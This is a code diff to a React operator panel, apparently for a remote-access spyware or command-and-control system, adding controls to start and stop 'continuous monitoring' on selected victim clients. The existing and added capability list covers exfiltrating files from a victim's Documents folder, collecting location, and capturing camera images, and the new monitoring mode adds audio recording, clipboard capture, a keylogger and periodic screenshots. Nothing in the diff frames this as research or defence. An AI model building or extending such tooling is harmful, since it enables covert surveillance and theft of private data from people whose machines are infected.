@@ -12,7 +12,9 @@ const CAPABILITY_METADATA = {
   7: { needsArgs: false, hint: 'Collects location data' },
   8: { needsArgs: true, hint: 'Exfiltrates a single file', placeholder: 'C:\\Users\\victim\\Documents\\secret.pdf' },
   9: { needsArgs: true, hint: 'Exfiltrates files by extension from directory', placeholder: '.pdf,.docx,.txt or C:\\path|.pdf,.docx' },
-  10: { needsArgs: false, hint: 'Captures image from camera' }
+  10: { needsArgs: false, hint: 'Captures image from camera' },
+  11: { needsArgs: false, hint: 'Starts continuous monitoring (audio, clipboard, keylogger, screenshot, camera)' },
+  12: { needsArgs: false, hint: 'Stops continuous monitoring' }
 };
 
 function Commands() {
@@ -24,11 +26,23 @@ function Commands() {
   const [sending, setSending] = useState(false);
   const [capabilities, setCapabilities] = useState({});
   const [loading, setLoading] = useState(true);
+  const [monitoringStatus, setMonitoringStatus] = useState({});
+  const [monitoringLoading, setMonitoringLoading] = useState(false);
 
   useEffect(() => {
     fetchClients();
     fetchCapabilities();
   }, []);
+
+  useEffect(() => {
+    // Refresh client data every 5 seconds to check monitoring status
+    const interval = setInterval(() => {
+      if (selectedClient) {
+        fetchClientStatus();
+      }
+    }, 5000);
+    return () => clearInterval(interval);
+  }, [selectedClient]);
 
   const fetchCapabilities = async () => {
     try {
@@ -44,9 +58,29 @@ function Commands() {
   const fetchClients = async () => {
     try {
       const data = await api.getClients();
-      setClients(Object.values(data.clients || {}));
+      const clientsArray = Object.values(data.clients || {});
+      setClients(clientsArray);
+      // Update monitoring status for all clients
+      const statusMap = {};
+      clientsArray.forEach(client => {
+        statusMap[client.id] = client.continuous_monitoring_enabled || false;
+      });
+      setMonitoringStatus(statusMap);
     } catch (error) {
       console.error('Error fetching clients:', error);
+    }
+  };
+
+  const fetchClientStatus = async () => {
+    if (!selectedClient) return;
+    try {
+      const data = await api.getClient(selectedClient);
+      setMonitoringStatus(prev => ({
+        ...prev,
+        [selectedClient]: data.client.continuous_monitoring_enabled || false
+      }));
+    } catch (error) {
+      console.error('Error fetching client status:', error);
     }
   };
 
@@ -86,7 +120,64 @@ function Commands() {
     }
   };
 
+  const handleStartMonitoring = async () => {
+    if (!selectedClient) {
+      setMessage({ type: 'error', text: 'Please select a client' });
+      return;
+    }
+
+    setMonitoringLoading(true);
+    try {
+      await api.startContinuousMonitoring(selectedClient);
+      setMonitoringStatus(prev => ({
+        ...prev,
+        [selectedClient]: true
+      }));
+      setMessage({ 
+        type: 'success', 
+        text: '✓ Continuous monitoring started' 
+      });
+      setTimeout(() => setMessage(null), 3000);
+    } catch (error) {
+      setMessage({ 
+        type: 'error', 
+        text: `Failed: ${error.response?.data?.message || error.message}` 
+      });
+    } finally {
+      setMonitoringLoading(false);
+    }
+  };
+
+  const handleStopMonitoring = async () => {
+    if (!selectedClient) {
+      setMessage({ type: 'error', text: 'Please select a client' });
+      return;
+    }
+
+    setMonitoringLoading(true);
+    try {
+      await api.stopContinuousMonitoring(selectedClient);
+      setMonitoringStatus(prev => ({
+        ...prev,
+        [selectedClient]: false
+      }));
+      setMessage({ 
+        type: 'success', 
+        text: '✓ Continuous monitoring stopped' 
+      });
+      setTimeout(() => setMessage(null), 3000);
+    } catch (error) {
+      setMessage({ 
+        type: 'error', 
+        text: `Failed: ${error.response?.data?.message || error.message}` 
+      });
+    } finally {
+      setMonitoringLoading(false);
+    }
+  };
+
   const capabilityMeta = CAPABILITY_METADATA[selectedCapability] || { needsArgs: false, hint: '' };
+  const isMonitoring = selectedClient && monitoringStatus[selectedClient];
 
   if (loading) {
     return <div className="loading">Loading capabilities...</div>;
@@ -95,7 +186,7 @@ function Commands() {
   return (
     <div>
       <div className="card">
-        <h2>Send Command</h2>
+        <h2>🔴 Continuous Monitoring</h2>
         
         {message && (
           <div className={`alert ${message.type}`}>
@@ -103,6 +194,47 @@ function Commands() {
           </div>
         )}
 
+        <div className="form-group">
+          <label>Select Client</label>
+          <select
+            value={selectedClient}
+            onChange={(e) => setSelectedClient(e.target.value)}
+          >
+            <option value="">-- Choose a client --</option>
+            {clients.map((client) => (
+              <option key={client.id} value={client.id}>
+                {client.id} - {client.ip}
+              </option>
+            ))}
+          </select>
+        </div>
+
+        {selectedClient && (
+          <div className="monitoring-info">
+            <p>
+              Status: <strong>{isMonitoring ? '🟢 ACTIVE' : '🔴 INACTIVE'}</strong>
+            </p>
+            <p className="small-text">
+              Monitors: Audio Recorder (5s), Clipboard Monitor (5s), Keylogger (5s)<br/>
+              Screenshot (60s), Camera Capture (60s)
+            </p>
+            
+            <div className="button-group">
+              <button 
+                className={`btn ${isMonitoring ? 'btn-danger' : 'btn-success'}`}
+                onClick={isMonitoring ? handleStopMonitoring : handleStartMonitoring}
+                disabled={monitoringLoading || !selectedClient}
+              >
+                {monitoringLoading ? '...' : (isMonitoring ? '⏹ STOP Monitoring' : '▶ START Monitoring')}
+              </button>
+            </div>
+          </div>
+        )}
+      </div>
+
+      <div className="card">
+        <h2>Send Command</h2>
+        
         <form onSubmit={handleSend}>
           <div className="form-group">
             <label>Select Client</label>
